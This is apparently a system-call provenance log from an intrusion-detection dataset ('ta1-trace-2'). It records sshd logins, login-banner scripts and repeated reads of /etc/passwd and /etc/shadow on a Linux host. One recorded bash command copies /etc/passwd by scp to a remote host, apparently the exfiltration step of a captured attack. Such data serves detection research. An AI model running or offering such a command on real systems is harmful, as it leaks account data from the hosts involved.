1557585184.682:1198600422,018DB6A5-EBF7-CB6C-A002-01272EC401F3:scp,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.682:1198600361,24ED6DF3-5B6D-29D9-1F20-ABAAE0AE454A:bash,EXECUTE,018DB6A5-EBF7-CB6C-A002-01272EC401F3,b'scp -r /etc/passwd admin@128.55.12.76:\\C:WindowsTemp',ta1-trace-2
1557585184.682:1198600355,0DA3E473-AB6F-5E0E-A4E2-66B38CFEF982:bash,FORK,24ED6DF3-5B6D-29D9-1F20-ABAAE0AE454A,bash,ta1-trace-2
1557585184.510:1198597216,0DA3E473-AB6F-5E0E-A4E2-66B38CFEF982:bash,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.506:1198597133,8E3E57F2-005A-B64D-3EAD-97D6C47E55F1:sshd,EXECUTE,0DA3E473-AB6F-5E0E-A4E2-66B38CFEF982,bash,ta1-trace-2
1557585184.506:1198597030,4A84AB8A-EEFF-73B9-5007-FAFE89C0A47E:sshd,FORK,8E3E57F2-005A-B64D-3EAD-97D6C47E55F1,sshd,ta1-trace-2
1557585184.506:1198596982,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.506:1198596976,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.506:1198596945,D124FB5E-1511-263C-5CBE-775A0DDCEAA4:sshd,CHANGE_PRINCIPAL,4A84AB8A-EEFF-73B9-5007-FAFE89C0A47E,sshd,ta1-trace-2
1557585184.506:1198596919,9D6D19AC-36D0-95ED-B066-A569AB0C321B:sshd,CHANGE_PRINCIPAL,D124FB5E-1511-263C-5CBE-775A0DDCEAA4,sshd,ta1-trace-2
1557585184.506:1198596914,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,FORK,9D6D19AC-36D0-95ED-B066-A569AB0C321B,sshd,ta1-trace-2
1557585184.506:1198596905,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.502:1198596869,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.502:1198596866,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.502:1198596863,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.502:1198596787,9148F833-9530-0CA4-1C4D-99F7A7B811BB:update-motd-fsc,EXECUTE,30543663-48F1-4ABA-B7D9-F902D487E1CE,cat,ta1-trace-2
1557585184.502:1198596785,46C8068B-FA29-0419-A23F-A91C5948F061:update-motd-fsc,FORK,9148F833-9530-0CA4-1C4D-99F7A7B811BB,update-motd-fsc,ta1-trace-2
1557585184.502:1198596570,17A05AC9-59CA-F69C-1C29-456665AE966F:98-fsck-at-rebo,EXECUTE,46C8068B-FA29-0419-A23F-A91C5948F061,update-motd-fsc,ta1-trace-2
1557585184.498:1198596548,93C27800-0F9C-F6C7-97AE-49AEFB9B67F3:run-parts,EXECUTE,17A05AC9-59CA-F69C-1C29-456665AE966F,98-fsck-at-rebo,ta1-trace-2
1557585184.498:1198596547,D81F0CD9-0632-A804-C297-CC466200AB12:run-parts,FORK,93C27800-0F9C-F6C7-97AE-49AEFB9B67F3,run-parts,ta1-trace-2
1557585184.498:1198596498,49C0C28B-890E-AC9F-00F0-E4258612F3D0:update-motd-hwe,EXECUTE,F833A0A7-8086-F65E-16BC-4E05BCB95930,cat,ta1-trace-2
1557585184.498:1198596496,61D54D84-CFF7-5F6C-833D-ACA535FF75CD:update-motd-hwe,FORK,49C0C28B-890E-AC9F-00F0-E4258612F3D0,update-motd-hwe,ta1-trace-2
1557585184.478:1198595115,8500CCA7-E1AE-82D2-17B3-DBA73A40BF56:95-hwe-eol,EXECUTE,61D54D84-CFF7-5F6C-833D-ACA535FF75CD,update-motd-hwe,ta1-trace-2
1557585184.478:1198595094,A1875798-7260-1500-C0E9-E015CA1838EA:run-parts,EXECUTE,8500CCA7-E1AE-82D2-17B3-DBA73A40BF56,95-hwe-eol,ta1-trace-2
1557585184.478:1198595093,D81F0CD9-0632-A804-C297-CC466200AB12:run-parts,FORK,A1875798-7260-1500-C0E9-E015CA1838EA,run-parts,ta1-trace-2
1557585184.462:1198594736,4E9938B2-1F8B-DA73-084F-163C0DE5BA67:lsb_release,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.450:1198594479,C1D5E9B9-32B2-18C8-ADF8-2C2C2BDB276C:91-release-upgr,EXECUTE,4E9938B2-1F8B-DA73-084F-163C0DE5BA67,lsb_release,ta1-trace-2
1557585184.450:1198594470,45E231B9-1968-64A6-EB7F-3EA09198506C:91-release-upgr,FORK,C1D5E9B9-32B2-18C8-ADF8-2C2C2BDB276C,91-release-upgr,ta1-trace-2
1557585184.450:1198594463,F91722D6-715D-68FB-2228-ED45CE9EBDE4:91-release-upgr,FORK,45E231B9-1968-64A6-EB7F-3EA09198506C,91-release-upgr,ta1-trace-2
1557585184.450:1198594441,ACEBAFF2-C6D6-AAA9-63A1-5347CFBA01B0:run-parts,EXECUTE,F91722D6-715D-68FB-2228-ED45CE9EBDE4,91-release-upgr,ta1-trace-2
1557585184.450:1198594440,D81F0CD9-0632-A804-C297-CC466200AB12:run-parts,FORK,ACEBAFF2-C6D6-AAA9-63A1-5347CFBA01B0,run-parts,ta1-trace-2
1557585184.450:1198594414,DA3EB19E-FE4C-1781-6FC5-0F47C13541A7:update-motd-upd,EXECUTE,5582133D-AD5D-CA65-578D-4D1A3B626F95,cat,ta1-trace-2
1557585184.450:1198594412,5F35C3CF-8016-9B16-A4E6-BAA999BE3981:update-motd-upd,FORK,DA3EB19E-FE4C-1781-6FC5-0F47C13541A7,update-motd-upd,ta1-trace-2
1557585184.434:1198593342,EE676008-08A7-3D54-E882-021CD02E6D3B:90-updates-avai,EXECUTE,5F35C3CF-8016-9B16-A4E6-BAA999BE3981,update-motd-upd,ta1-trace-2
1557585184.434:1198593321,F37BAEC3-A193-157E-05CF-65594947CBF3:run-parts,EXECUTE,EE676008-08A7-3D54-E882-021CD02E6D3B,90-updates-avai,ta1-trace-2
1557585184.434:1198593320,D81F0CD9-0632-A804-C297-CC466200AB12:run-parts,FORK,F37BAEC3-A193-157E-05CF-65594947CBF3,run-parts,ta1-trace-2
1557585184.318:1198586213,4BC305A4-95EA-F4A7-318D-20A01292BCB7:landscape-sysin,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.314:1198585791,DE775741-7432-5C97-EBE8-52F09E6C9CE3:50-landscape-sy,EXECUTE,4BC305A4-95EA-F4A7-318D-20A01292BCB7,landscape-sysin,ta1-trace-2
1557585184.314:1198585786,2913A3B4-65DD-A13D-C52E-05E111DB26FD:50-landscape-sy,FORK,DE775741-7432-5C97-EBE8-52F09E6C9CE3,50-landscape-sy,ta1-trace-2
1557585184.310:1198585539,FD3B3E6F-0A85-2105-6A4A-3826D22A1AB8:run-parts,EXECUTE,2913A3B4-65DD-A13D-C52E-05E111DB26FD,50-landscape-sy,ta1-trace-2
1557585184.310:1198585537,D81F0CD9-0632-A804-C297-CC466200AB12:run-parts,FORK,FD3B3E6F-0A85-2105-6A4A-3826D22A1AB8,run-parts,ta1-trace-2
1557585184.306:1198585203,74624CB2-A7BC-6C3F-1BDB-C5ADBF3E5817:env,EXECUTE,D81F0CD9-0632-A804-C297-CC466200AB12,run-parts,ta1-trace-2
1557585184.306:1198585155,7D26839F-D837-745F-5980-3CE98A023B73:sh,EXECUTE,74624CB2-A7BC-6C3F-1BDB-C5ADBF3E5817,env,ta1-trace-2
1557585184.306:1198585134,1202E674-EAA6-BF4B-62FF-58D64E265483:sh,FORK,7D26839F-D837-745F-5980-3CE98A023B73,sh,ta1-trace-2
1557585184.306:1198585088,F20322B9-3E01-6E39-4BFE-FE57258D09AA:sshd,EXECUTE,1202E674-EAA6-BF4B-62FF-58D64E265483,sh,ta1-trace-2
1557585184.306:1198585058,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,FORK,F20322B9-3E01-6E39-4BFE-FE57258D09AA,sshd,ta1-trace-2
1557585184.306:1198585021,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.294:1198584866,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.294:1198584815,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.294:1198584803,8B03D5C7-00F5-69E4-06C1-C28D8BB490AC:sshd,CHANGE_PRINCIPAL,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0,sshd,ta1-trace-2
1557585184.294:1198584802,6494B4F5-55BA-984C-0989-7EA3056C803D:sshd,CHANGE_PRINCIPAL,8B03D5C7-00F5-69E4-06C1-C28D8BB490AC,sshd,ta1-trace-2
1557585184.294:1198584801,8B03D5C7-00F5-69E4-06C1-C28D8BB490AC:sshd,CHANGE_PRINCIPAL,6494B4F5-55BA-984C-0989-7EA3056C803D,sshd,ta1-trace-2
1557585184.294:1198584800,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,CHANGE_PRINCIPAL,8B03D5C7-00F5-69E4-06C1-C28D8BB490AC,sshd,ta1-trace-2
1557585184.294:1198584798,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.294:1198584784,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.294:1198584744,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557585184.294:1198584741,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.290:1198584697,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557585184.286:1198584694,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.186:1198584300,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.186:1198584268,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557585184.186:1198584267,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557585184.094:1198583901,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585184.090:1198583645,341456A7-FC6F-E143-7CEB-279A38F368EC:sshd,EXECUTE,A450F2EE-2EB1-47D4-7BA7-9B47E024C2B0,sshd,ta1-trace-2
1557585184.090:1198583624,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,341456A7-FC6F-E143-7CEB-279A38F368EC,sshd,ta1-trace-2
1557585178.930:1198570775,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.930:1198570693,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.926:1198570612,8368ED35-D52B-424D-99E1-2DACCDE584D1:sshd,CHANGE_PRINCIPAL,6638401F-560D-76AE-EC0A-2CA125609BEE,sshd,ta1-trace-2
1557585178.926:1198570611,8368ED35-D52B-424D-99E1-2DACCDE584D1:sshd,CHANGE_PRINCIPAL,8368ED35-D52B-424D-99E1-2DACCDE584D1,sshd,ta1-trace-2
1557585178.926:1198570610,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,CHANGE_PRINCIPAL,8368ED35-D52B-424D-99E1-2DACCDE584D1,sshd,ta1-trace-2
1557585178.646:1198567269,AFCE0562-B41F-FBC8-992B-823A9C381AEF:bash,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.646:1198567186,B4E7AD1E-A180-2CB6-46C0-B84071D7F79D:sshd,EXECUTE,AFCE0562-B41F-FBC8-992B-823A9C381AEF,bash,ta1-trace-2
1557585178.642:1198567085,F7BE618F-CE71-41C6-CAD1-B7D8253EA3A5:sshd,FORK,B4E7AD1E-A180-2CB6-46C0-B84071D7F79D,sshd,ta1-trace-2
1557585178.642:1198567039,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198567033,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198567013,1ED83B2B-83B5-E3EF-DC7D-832BFA18A8E0:sshd,CHANGE_PRINCIPAL,F7BE618F-CE71-41C6-CAD1-B7D8253EA3A5,sshd,ta1-trace-2
1557585178.642:1198566991,E48D058A-9E3A-3BB2-C519-17827786E760:sshd,CHANGE_PRINCIPAL,1ED83B2B-83B5-E3EF-DC7D-832BFA18A8E0,sshd,ta1-trace-2
1557585178.642:1198566988,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,FORK,E48D058A-9E3A-3BB2-C519-17827786E760,sshd,ta1-trace-2
1557585178.642:1198566979,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198566943,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198566940,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198566937,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.642:1198566861,00C272FF-FA4E-0054-7981-A2AD3838BED9:update-motd-fsc,EXECUTE,764C5D9F-B133-B55D-FEA0-7B918EC8F650,cat,ta1-trace-2
1557585178.642:1198566859,67B2B26D-9A45-7C9A-8425-BA2BEAE53AC2:update-motd-fsc,FORK,00C272FF-FA4E-0054-7981-A2AD3838BED9,update-motd-fsc,ta1-trace-2
1557585178.638:1198566644,928D1F1F-5CB3-F3FE-D3BF-6D510B479C2E:98-fsck-at-rebo,EXECUTE,67B2B26D-9A45-7C9A-8425-BA2BEAE53AC2,update-motd-fsc,ta1-trace-2
1557585178.638:1198566622,6CA417AA-3559-4179-4003-97B34E3C78A7:run-parts,EXECUTE,928D1F1F-5CB3-F3FE-D3BF-6D510B479C2E,98-fsck-at-rebo,ta1-trace-2
1557585178.638:1198566621,DC9E2BF2-92CD-C852-8624-58507D041330:run-parts,FORK,6CA417AA-3559-4179-4003-97B34E3C78A7,run-parts,ta1-trace-2
1557585178.638:1198566566,25789534-7A6E-7AF4-9C80-F60787E5610E:update-motd-hwe,EXECUTE,56FA9607-8843-58AB-34EE-2020317E32A3,cat,ta1-trace-2
1557585178.638:1198566563,8DCD44B0-7B55-C8D6-0CE7-1D29A369B08F:update-motd-hwe,FORK,25789534-7A6E-7AF4-9C80-F60787E5610E,update-motd-hwe,ta1-trace-2
1557585178.618:1198565188,2912A8CB-E9CF-5D93-D635-8C794A8525D3:95-hwe-eol,EXECUTE,8DCD44B0-7B55-C8D6-0CE7-1D29A369B08F,update-motd-hwe,ta1-trace-2
1557585178.618:1198565167,30994AF5-C88C-FE2A-B36E-D3A7F2537D6C:run-parts,EXECUTE,2912A8CB-E9CF-5D93-D635-8C794A8525D3,95-hwe-eol,ta1-trace-2
1557585178.618:1198565166,DC9E2BF2-92CD-C852-8624-58507D041330:run-parts,FORK,30994AF5-C88C-FE2A-B36E-D3A7F2537D6C,run-parts,ta1-trace-2
1557585178.598:1198564792,DE8B9C60-5744-1F26-94E7-BFE3EA681F52:lsb_release,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.590:1198564533,62FCF047-46CC-F406-F40E-009074AC4E41:91-release-upgr,EXECUTE,DE8B9C60-5744-1F26-94E7-BFE3EA681F52,lsb_release,ta1-trace-2
1557585178.590:1198564524,79AFFD21-1984-3465-42EA-5AF7646272EE:91-release-upgr,FORK,62FCF047-46CC-F406-F40E-009074AC4E41,91-release-upgr,ta1-trace-2
1557585178.590:1198564517,D659D55A-48C2-7F5D-1EDF-62E55F213C26:91-release-upgr,FORK,79AFFD21-1984-3465-42EA-5AF7646272EE,91-release-upgr,ta1-trace-2
1557585178.586:1198564495,30F10919-F670-FAE7-FDA4-6412E28D92AA:run-parts,EXECUTE,D659D55A-48C2-7F5D-1EDF-62E55F213C26,91-release-upgr,ta1-trace-2
1557585178.586:1198564494,DC9E2BF2-92CD-C852-8624-58507D041330:run-parts,FORK,30F10919-F670-FAE7-FDA4-6412E28D92AA,run-parts,ta1-trace-2
1557585178.586:1198564468,29ED2860-DF93-54B4-D0DA-257012B21790:update-motd-upd,EXECUTE,057B9993-47F3-97FB-627C-9E536AEA6F27,cat,ta1-trace-2
1557585178.586:1198564466,5D1624F9-8970-33DF-81EB-CF21025262A1:update-motd-upd,FORK,29ED2860-DF93-54B4-D0DA-257012B21790,update-motd-upd,ta1-trace-2
1557585178.574:1198563415,E0D8115B-078C-A87F-8FC9-7F681B47351E:90-updates-avai,EXECUTE,5D1624F9-8970-33DF-81EB-CF21025262A1,update-motd-upd,ta1-trace-2
1557585178.570:1198563394,209E108C-9A0C-F7CC-03B9-A959E60823E7:run-parts,EXECUTE,E0D8115B-078C-A87F-8FC9-7F681B47351E,90-updates-avai,ta1-trace-2
1557585178.570:1198563393,DC9E2BF2-92CD-C852-8624-58507D041330:run-parts,FORK,209E108C-9A0C-F7CC-03B9-A959E60823E7,run-parts,ta1-trace-2
1557585178.450:1198556199,E4F2EF44-A4E2-1DAE-0854-02CC2AF9AD91:landscape-sysin,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.446:1198555809,9D7682D6-43CB-2CE3-2978-AB27FBAD8016:50-landscape-sy,EXECUTE,E4F2EF44-A4E2-1DAE-0854-02CC2AF9AD91,landscape-sysin,ta1-trace-2
1557585178.446:1198555802,1CC9D028-CEB2-8768-240B-879EF4CAAD40:50-landscape-sy,FORK,9D7682D6-43CB-2CE3-2978-AB27FBAD8016,50-landscape-sy,ta1-trace-2
1557585178.442:1198555532,EF5A1E47-C0E3-AE89-C987-0D25DC935FA5:run-parts,EXECUTE,1CC9D028-CEB2-8768-240B-879EF4CAAD40,50-landscape-sy,ta1-trace-2
1557585178.442:1198555530,DC9E2BF2-92CD-C852-8624-58507D041330:run-parts,FORK,EF5A1E47-C0E3-AE89-C987-0D25DC935FA5,run-parts,ta1-trace-2
1557585178.438:1198555213,FCB86155-5D2D-B4C0-7951-DAA33D0BED50:env,EXECUTE,DC9E2BF2-92CD-C852-8624-58507D041330,run-parts,ta1-trace-2
1557585178.438:1198555187,6F469CB0-E983-6430-9585-46033E06BCD3:sh,EXECUTE,FCB86155-5D2D-B4C0-7951-DAA33D0BED50,env,ta1-trace-2
1557585178.438:1198555182,14E47493-E943-EB26-85A2-E092CBA05117:sh,FORK,6F469CB0-E983-6430-9585-46033E06BCD3,sh,ta1-trace-2
1557585178.438:1198555120,A7052AB7-6C95-2D53-651D-D9E4DE03DC2D:sshd,EXECUTE,14E47493-E943-EB26-85A2-E092CBA05117,sh,ta1-trace-2
1557585178.438:1198555102,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,FORK,A7052AB7-6C95-2D53-651D-D9E4DE03DC2D,sshd,ta1-trace-2
1557585178.438:1198555074,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.422:1198554696,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.422:1198554645,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.422:1198554633,1F0B0847-0147-4993-CFB2-C46593039C0E:sshd,CHANGE_PRINCIPAL,6638401F-560D-76AE-EC0A-2CA125609BEE,sshd,ta1-trace-2
1557585178.422:1198554632,0DAE6D23-9B26-7296-A798-9DA657CDB87C:sshd,CHANGE_PRINCIPAL,1F0B0847-0147-4993-CFB2-C46593039C0E,sshd,ta1-trace-2
1557585178.422:1198554631,1F0B0847-0147-4993-CFB2-C46593039C0E:sshd,CHANGE_PRINCIPAL,0DAE6D23-9B26-7296-A798-9DA657CDB87C,sshd,ta1-trace-2
1557585178.422:1198554630,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,CHANGE_PRINCIPAL,1F0B0847-0147-4993-CFB2-C46593039C0E,sshd,ta1-trace-2
1557585178.422:1198554628,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.422:1198554614,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.422:1198554574,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557585178.422:1198554571,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.414:1198554527,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557585178.414:1198554524,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.314:1198554129,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.314:1198554097,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557585178.314:1198554096,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557585178.222:1198553730,6638401F-560D-76AE-EC0A-2CA125609BEE:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585178.222:1198553474,DA49E3C2-E3A3-0F17-543C-2EA3FB900F5D:sshd,EXECUTE,6638401F-560D-76AE-EC0A-2CA125609BEE,sshd,ta1-trace-2
1557585178.222:1198553453,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,DA49E3C2-E3A3-0F17-543C-2EA3FB900F5D,sshd,ta1-trace-2
1557585169.070:1198533311,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585169.066:1198533165,9A4081D2-014A-F0A1-6D6A-722AF2665ED5:sshd,CHANGE_PRINCIPAL,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD,sshd,ta1-trace-2
1557585169.066:1198533164,9A4081D2-014A-F0A1-6D6A-722AF2665ED5:sshd,CHANGE_PRINCIPAL,9A4081D2-014A-F0A1-6D6A-722AF2665ED5,sshd,ta1-trace-2
1557585169.066:1198533163,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,CHANGE_PRINCIPAL,9A4081D2-014A-F0A1-6D6A-722AF2665ED5,sshd,ta1-trace-2
1557585169.066:1198533106,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585166.102:1198103475,090FE2FC-601F-D629-9430-0C6F2B8D00E5:bash,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585166.102:1198103392,24D2D5B1-3D38-C8EC-B620-D8A3E4B478ED:sshd,EXECUTE,090FE2FC-601F-D629-9430-0C6F2B8D00E5,bash,ta1-trace-2
1557585166.102:1198103285,30E6BFB4-E4CB-4611-7577-9ABD98E194AB:sshd,FORK,24D2D5B1-3D38-C8EC-B620-D8A3E4B478ED,sshd,ta1-trace-2
1557585166.102:1198103239,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585166.102:1198103233,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585166.102:1198103213,AFB750F8-AE0C-A598-DB42-972A54545F6F:sshd,CHANGE_PRINCIPAL,30E6BFB4-E4CB-4611-7577-9ABD98E194AB,sshd,ta1-trace-2
1557585166.102:1198103191,61535E55-5E9D-AE80-1C0F-12D6B26BA308:sshd,CHANGE_PRINCIPAL,AFB750F8-AE0C-A598-DB42-972A54545F6F,sshd,ta1-trace-2
1557585166.102:1198103188,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,FORK,61535E55-5E9D-AE80-1C0F-12D6B26BA308,sshd,ta1-trace-2
1557585166.102:1198103179,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
1557585166.098:1198103143,1E202B40-EE5B-EF1C-F87E-3B00970EDEAD:sshd,MMAP,6EC611EA-ABFB-544F-B057-BFFE4F814092,/etc/passwd,ta1-trace-2
